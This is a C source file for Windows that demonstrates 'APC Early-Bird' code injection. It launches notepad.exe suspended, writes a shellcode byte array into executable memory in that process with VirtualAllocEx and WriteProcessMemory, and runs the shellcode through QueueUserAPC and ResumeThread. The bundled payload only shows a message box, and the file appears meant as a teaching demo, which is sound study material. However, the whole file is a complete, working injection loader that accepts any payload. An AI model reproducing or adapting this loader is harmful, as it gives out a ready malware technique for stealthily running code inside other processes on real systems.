#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

// x64 MessageBox shellcode
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x45\x61\x72\x6c\x79\x20\x42"
    "\x69\x72\x64\x20\x41\x50\x43\x21\x00\x48\x65\x6c\x6c\x6f\x20"
    "\x57\x6f\x72\x6c\x64\x21\x00";

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID remoteShellcode = NULL;

    printf("[ APC Early-Bird Injection ]\n");
    printf("[*] Process ID: %d\n", GetCurrentProcessId());

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);

    // 1. Create target process in SUSPENDED state
    printf("\n[*] Creating suspended process: notepad.exe\n");

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED, // CRITICAL: Process starts with thread frozen!
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Process created. PID: %d\n", pi.dwProcessId);
    printf("[+] Main thread suspended. Handle: %p\n", pi.hThread);

    // 2. Allocate memory in the target process
    printf("\n[*] Allocating memory in target process...\n");

    remoteShellcode = VirtualAllocEx(
        pi.hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remoteShellcode)
    {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Memory allocated at: %p (in target process)\n", remoteShellcode);

    // 3. Write shellcode to the allocated memory
    printf("\n[*] Writing shellcode to target process...\n");

    if (!WriteProcessMemory(
            pi.hProcess,
            remoteShellcode,
            shellcode,
            sizeof(shellcode),
            NULL))
    {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Shellcode written (%zu bytes)\n", sizeof(shellcode));

    // 4. Queue APC to the SUSPENDED thread
    printf("\n[*] Queueing APC to suspended thread...\n");

    if (!QueueUserAPC(
            (PAPCFUNC)remoteShellcode, // APC function = shellcode in target process
            pi.hThread,                // Handle to SUSPENDED thread
            0))                        // Parameter
    {
        printf("[-] QueueUserAPC failed: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] APC queued successfully!\n");
    printf("[!] APC is waiting in kernel queue - NOT executing yet\n");

    // 5. Resume the thread - APC executes IMMEDIATELY
    printf("\n[*] Resuming thread...\n");
    printf("[!] APC will execute BEFORE process entry point!\n");

    ResumeThread(pi.hThread);

    printf("[+] Thread resumed. APC executing NOW!\n");
    printf("[+] Check for MessageBox from notepad.exe\n");

    // 6. Wait for process to exit (optional)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 7. Cleanup
    VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("\n[*] Process terminated. Demo complete.\n");
    system("pause");

    return 0;
}

// x86_64-w64-mingw32-gcc -o apc_early_bird.exe apc_early_bird.c